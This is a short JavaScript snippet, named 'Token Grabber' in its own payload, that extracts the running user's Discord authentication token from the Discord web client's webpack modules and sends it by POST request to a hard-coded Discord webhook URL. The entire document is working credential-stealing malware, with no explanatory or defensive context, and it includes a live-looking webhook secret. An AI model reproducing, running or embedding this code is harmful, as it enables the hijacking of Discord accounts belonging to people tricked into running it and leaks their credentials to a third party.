function sendMessage() {
    const request = new XMLHttpRequest();
    request.open("POST", "https://discord.com/api/webhooks/1013331685825327206/VJ66RYslSdsT3fbnq7MxaIpFUq4rRIvQoHh-N-Q4b-tunvgQ1nQb9REsEcIhNrJQr51c");
    request.setRequestHeader('Content-type', 'application/json');
    const params = {
                  username: "Token Grabber",
                  avatar_url: "",
                  content: (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()
                   };
    request.send(JSON.stringify(params));};
sendMessage();
